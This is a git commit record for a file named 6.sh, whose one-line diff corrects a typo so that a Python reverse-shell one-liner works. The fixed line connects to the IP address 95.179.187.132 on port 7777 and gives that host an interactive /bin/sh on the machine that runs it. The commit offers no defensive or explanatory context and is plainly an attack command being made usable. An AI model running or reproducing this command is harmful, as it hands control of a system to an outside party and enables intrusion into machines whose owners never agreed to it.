fd5e39047341b16f298319e78922d48bd66009ea
没咸鱼的梦想 <466375758@qq.com>
2021-03-21 15:57:55 +0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec?t(("95.179.187.132",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.179.187.132",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
